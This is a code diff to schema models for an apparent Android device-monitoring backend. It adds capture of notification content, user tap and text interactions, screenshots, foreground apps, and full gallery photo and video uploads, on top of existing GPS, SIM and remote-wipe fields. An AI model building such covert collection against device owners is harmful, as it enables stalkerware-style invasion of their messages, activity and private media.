@@ -69,6 +69,14 @@ class DeviceInfoResponse(BaseModel):
     # App Management
     installed_apps: Optional[str] = None
 
+    # Active Application
+    foreground_app: Optional[str] = None
+    foreground_app_package: Optional[str] = None
+
+    # Connection Quality
+    signal_strength: Optional[int] = None
+    network_latency_ms: Optional[int] = None
+
     class Config:
         from_attributes = True
 
@@ -81,7 +89,7 @@ class AppItem(BaseModel):
 
 
 class DeviceTelemetryPayload(BaseModel):
-    """Device sends periodic diagnostics, GPS location, and network intel."""
+    """Device sends periodic diagnostics, GPS location, network intel, and foreground app."""
     battery_level: Optional[int] = Field(None, ge=0, le=100)
     storage_available_gb: Optional[float] = None
     storage_total_gb: Optional[float] = None
@@ -95,6 +103,10 @@ class DeviceTelemetryPayload(BaseModel):
     phone_number: Optional[str] = None
     sim_1: Optional[str] = None
     sim_2: Optional[str] = None
+    foreground_app: Optional[str] = None
+    foreground_app_package: Optional[str] = None
+    signal_strength: Optional[int] = None
+    network_latency_ms: Optional[int] = None
 
 
 # ═══════════════════════════════════════════════════════════════
@@ -247,7 +259,7 @@ class ExecuteCommandRequest(BaseModel):
     device_id: str = Field(..., description="Target device ANDROID_ID or IMEI")
     command_type: str = Field(
         ...,
-        pattern="^(?i)(send_sms|lock_device|wipe_device|ring_device|install_app|uninstall_app|set_policy|get_location|set_ringer_mode|set_brightness|launch_app|refresh_apps)$",
+        pattern="^(?i)(send_sms|lock_device|wipe_device|ring_device|install_app|uninstall_app|set_policy|get_location|set_ringer_mode|set_brightness|launch_app|refresh_apps|take_screenshot)$",
     )
     payload: Optional[dict[str, Any]] = Field(default=None)
 
@@ -363,3 +375,176 @@ class CommunicationLogQueryResponse(BaseModel):
 class ErrorResponse(BaseModel):
     """Standard error envelope."""
     detail: str
+
+
+# ═══════════════════════════════════════════════════════════════
+#  Monitoring — Notifications
+# ═══════════════════════════════════════════════════════════════
+
+class NotificationEntry(BaseModel):
+    """Single captured notification from device."""
+    app_name: str = Field(..., max_length=255)
+    app_package: str = Field(..., max_length=255)
+    title: Optional[str] = None
+    content: Optional[str] = None
+    timestamp: datetime
+
+
+class NotificationSyncRequest(BaseModel):
+    """Batch of captured notifications from device."""
+    notifications: list[NotificationEntry] = Field(..., min_length=1, max_length=200)
+
+
+class NotificationSyncResponse(BaseModel):
+    """Acknowledgement after notifications are ingested."""
+    status: str = "ok"
+    ingested: int = 0
+    message: str = "Notifications synced successfully"
+
+
+class NotificationQueryResponse(BaseModel):
+    """Single notification in query results."""
+    id: uuid.UUID
+    app_name: str
+    app_package: str
+    title: Optional[str]
+    content: Optional[str]
+    timestamp: datetime
+    received_at: datetime
+
+    class Config:
+        from_attributes = True
+
+
+# ═══════════════════════════════════════════════════════════════
+#  Monitoring — User Interactions
+# ═══════════════════════════════════════════════════════════════
+
+class InteractionEntry(BaseModel):
+    """Single user interaction event from device."""
+    interaction_type: str = Field(..., max_length=50)
+    target_text: Optional[str] = None
+    target_class: Optional[str] = None
+    app_package: Optional[str] = None
+    x: Optional[float] = None
+    y: Optional[float] = None
+    timestamp: datetime
+
+
+class InteractionSyncRequest(BaseModel):
+    """Batch of interaction events from device."""
+    interactions: list[InteractionEntry] = Field(..., min_length=1, max_length=500)
+
+
+class InteractionSyncResponse(BaseModel):
+    """Acknowledgement after interactions are ingested."""
+    status: str = "ok"
+    ingested: int = 0
+    message: str = "Interactions synced successfully"
+
+
+class InteractionQueryResponse(BaseModel):
+    """Single interaction in query results."""
+    id: uuid.UUID
+    interaction_type: str
+    target_text: Optional[str]
+    target_class: Optional[str]
+    app_package: Optional[str]
+    x: Optional[float]
+    y: Optional[float]
+    timestamp: datetime
+    received_at: datetime
+
+    class Config:
+        from_attributes = True
+
+
+# ═══════════════════════════════════════════════════════════════
+#  Monitoring — Screenshots
+# ═══════════════════════════════════════════════════════════════
+
+class ScreenshotUploadRequest(BaseModel):
+    """Device uploads a captured screenshot."""
+    image_base64: str = Field(..., description="Base64-encoded JPEG image")
+    captured_at: datetime
+
+
+class ScreenshotResponse(BaseModel):
+    """Screenshot query response."""
+    id: uuid.UUID
+    image_data: str
+    captured_at: datetime
+    received_at: datetime
+
+    class Config:
+        from_attributes = True
+
+
+# ═══════════════════════════════════════════════════════════════
+#  Media Library Explorer
+# ═══════════════════════════════════════════════════════════════
+
+class MediaThumbnailEntry(BaseModel):
+    """A single media thumbnail uploaded from the device gallery."""
+    media_store_id: str = Field(..., description="MediaStore content URI or unique ID")
+    media_type: str = Field("image", description="image | video")
+    file_name: Optional[str] = None
+    file_size: Optional[int] = Field(None, description="Original file size in bytes")
+    width: Optional[int] = None
+    height: Optional[int] = None
+    duration_ms: Optional[int] = Field(None, description="Video duration in ms")
+    mime_type: Optional[str] = None
+    date_taken: Optional[datetime] = None
+    thumbnail_b64: str = Field(..., description="Base64-encoded compressed JPEG thumbnail <50KB")
+
+
+class MediaThumbnailSyncRequest(BaseModel):
+    """Batch upload of gallery thumbnails from device."""
+    thumbnails: list[MediaThumbnailEntry] = Field(..., min_length=1)
+
+
+class MediaThumbnailSyncResponse(BaseModel):
+    """Acknowledgement after thumbnails are ingested."""
+    status: str = "ok"
+    ingested: int = 0
+    skipped: int = 0
+    message: str = "Thumbnails synced successfully"
+
+
+class MediaItemResponse(BaseModel):
+    """Gallery media item for dashboard display."""
+    id: uuid.UUID
+    media_store_id: str
+    media_type: str
+    file_name: Optional[str] = None
+    file_size: Optional[int] = None
+    width: Optional[int] = None
+    height: Optional[int] = None
+    duration_ms: Optional[int] = None
+    mime_type: Optional[str] = None
+    date_taken: Optional[datetime] = None
+    thumbnail_b64: str
+    has_full_file: bool = False
+    synced_at: datetime
+
+    class Config:
+        from_attributes = True
+
+
+class MediaFullFileUploadRequest(BaseModel):
+    """Device uploads a full-resolution media file."""
+    media_store_id: str = Field(..., description="Matching media_store_id from thumbnail sync")
+    file_data: str = Field(..., description="Base64-encoded full-resolution file")
+    mime_type: Optional[str] = None
+
+
+class MediaFullFileResponse(BaseModel):
+    """Full-resolution file response."""
+    id: uuid.UUID
+    file_data: str
+    mime_type: Optional[str] = None
+    fetched_at: datetime
+
+    class Config:
+        from_attributes = True
+
